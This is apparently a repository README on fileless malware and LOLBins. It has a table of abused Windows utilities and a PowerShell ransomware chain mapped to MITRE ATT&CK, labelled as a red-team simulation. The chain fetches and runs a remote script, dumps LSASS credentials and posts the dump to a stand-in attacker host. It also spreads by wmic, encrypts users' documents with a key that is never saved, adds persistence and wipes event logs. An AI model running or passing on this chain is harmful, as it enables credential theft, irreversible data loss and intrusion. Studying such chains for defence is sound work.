
<div align="center">

## 🧠 **100% Fileless Malware Simulation**
> High-fidelity adversary emulation using in-memory execution and LOLBins

![License](https://img.shields.io/badge/license-MIT-black?style=flat-square)
![Status](https://img.shields.io/badge/build-simulation-lightgrey?style=flat-square)
![Scope](https://img.shields.io/badge/type-red_team-blue?style=flat-square)
![MITRE ATT&CK](https://img.shields.io/badge/framework-MITRE_ATT%26CK-red?style=flat-square)

</div>
![Fileless Malware Concept](https://github.com/user-attachments/assets/3108f067-a49b-45c1-b1c4-07691881c76b)
---

## ⚠️ Advisory Warning: Educational Use Only  
This repository contains content related to NSFW (Not Safe for Work) cybersecurity topics including fileless malware, LOLBins, and adversary simulation tactics. The information provided is strictly for **educational, academic, and controlled research lab environments only**. **Do not deploy or replicate these techniques in unauthorized systems.** Misuse may constitute a violation of laws and ethical guidelines.

---

## Overview:
Fileless malware is a type of attack that runs entirely in memory, using built-in system tools like PowerShell and rundll32 without ever writing files to disk, making it difficult for traditional antivirus to detect. While a fully fileless chain is possible—leveraging phishing, in-memory injection, and living-off-the-land binaries—in practice, traces like temporary files or registry entries often still appear during execution.
**LOLBins** (Living off the Land Binaries) are legitimate Windows system utilities that adversaries repurpose to execute code, evade defenses, and persist. These tools are trusted, signed, and often overlooked by endpoint security solutions.

### ⚙️ Common LOLBins and Their Abuse Cases

| LOLBin              | Abused For                       | ATT&CK Tactics                          |
|---------------------|----------------------------------|-----------------------------------------|
| `rundll32.exe`      | DLL execution                    | Code execution, EDR bypass              |
| `mshta.exe`         | Run HTA payloads                 | Script execution, sandbox evasion       |
| `regsvr32.exe`      | Load COM DLLs                    | Fileless execution, C2 proxy            |
| `wmic.exe`          | Remote command execution         | Process launch, lateral movement        |
| `cmd.exe / powershell.exe` | Script runners          | Payload staging, persistence            |
| `msbuild.exe`       | Inline C# compile/exec           | Fileless malware loading                |
| `certutil.exe`      | Download/decode files            | Exfiltration, staging                   |
| `bitsadmin.exe`     | Remote file fetch                | Delivery, task persistence              |
| `schtasks.exe`      | Task scheduling                  | Privilege escalation, persistence       |
| `esentutl.exe`      | Copy/exec binary payloads        | Stealth operations, exfiltration        |

---

## 🧬 Theoretical Simulation: 100% Fileless Ransomware  
*Using the [MITRE ATT&CK](https://attack.mitre.org/) Framework for Mapping TTPs*

> ⚠️ **Disclaimer**: Code below is a synthetic simulation script intended for red team R&D under proper authorization. DO NOT EXECUTE OUTSIDE OF A SANDBOX ENVIRONMENT.

<details>
<summary>Click to view simulated PowerShell ransomware chain</summary>

```powershell
# 🎯 1. Initial Access (T1190)
$payloadUrl = "http://malicious.com/dropper.ps1"
IEX(New-Object Net.WebClient).DownloadString($payloadUrl)

# ⚡ 2. Execution (T1059.001)
$encPayload = "[Base64-Encoded Payload]"
$decodedPayload = [System.Convert]::FromBase64String($encPayload)
[System.Reflection.Assembly]::Load($decodedPayload)

# 🔓 3. Privilege Escalation (T1548)
Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File C:\Windows\Temp\elevate.ps1" -Verb RunAs

# 🧪 4. Credential Access (T1003.001)
Invoke-Expression "rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\lsass.dmp full"

# 🔍 5. Discovery (T1082)
$sysInfo = Get-WmiObject Win32_ComputerSystem | Select Manufacturer, Model, Name, Domain, UserName
$networkInfo = Get-NetAdapter | Select Name, MacAddress, Status
Write-Output $sysInfo; Write-Output $networkInfo

# 🌐 6. Lateral Movement (T1021.001)
cmd.exe /c "wmic /node:targetPC process call create 'powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\payload.ps1'"

# 💣 7. Impact: File Encryption (T1486)
$targetFiles = Get-ChildItem -Path "C:\Users\*\Documents" -Include *.txt,*.docx,*.xls -Recurse
foreach ($file in $targetFiles) {
    $content = Get-Content $file.FullName -Raw
    $key = (1..32 | ForEach-Object { [char](Get-Random -Minimum 65 -Maximum 90) }) -join ''
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = [System.Text.Encoding]::UTF8.GetBytes($key.PadRight(32, 'X'))
    $aes.IV = New-Object byte[] 16
    $encryptor = $aes.CreateEncryptor()
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($content)
    $encryptedContent = [Convert]::ToBase64String($encryptor.TransformFinalBlock($bytes, 0, $bytes.Length))
    Set-Content -Path $file.FullName -Value $encryptedContent
}

# 📌 8. Persistence (T1547.001)
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "MaliciousProcess" -Value "powershell -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1"
schtasks /create /tn "MaliciousTask" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\Windows\Temp\persist.ps1" /sc onlogon /rl highest

# 📤 9. Exfiltration (T1041)
$exfilData = [Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\Windows\Temp\lsass.dmp"))
Invoke-WebRequest -Uri "http://malicious.com/exfil" -Method Post -Body $exfilData

# 🧹 10. Defense Evasion (T1070)
Remove-Item -Path C:\Windows\Temp\* -Force -Recurse
wevtutil cl System; wevtutil cl Security; wevtutil cl Application
cmd.exe /c "attrib +h +s C:\Windows\Temp\*"
```

</details>

---

## 🧭 Additional Resources

- 🔧 [PrintNightmare Deep Dive](https://itm4n.github.io/printnightmare-not-over/)
- 💀 [PrintNightmare Vulnerability Summary](https://cybersparksdotblog.wordpress.com/2024/11/25/windows-print-spooler-eop-the-printnightmare-of-2021/)
- 🛠️ [LOLOL Farm – LOLBin Playground](https://lolol.farm/)
- 🧠 [MITRE ATT&CK Entry - S0697](https://attack.mitre.org/software/S0697/)
- 🧬 [LOLGEN - Generate Abuse Chains](https://lolgen.hdks.org/)
- 🦠 [Fileless Malware – Wikipedia Overview](https://en.wikipedia.org/wiki/Fileless_malware)
- 🔗 [DLL Injection Reference](https://www.crow.rip/crows-nest/mal/dev/inject/dll-injection)
- 🖨️ [Printer Driver Exploits](https://github.com/jacob-baines/concealed_position)

---

### 🛡️ Final Note
This repository is a research artifact intended for cybersecurity professionals, malware analysts, and red team operators. Unauthorized use, real-world deployment, or replication of these techniques is prohibited. Always operate within the bounds of your local laws and professional codes of conduct.

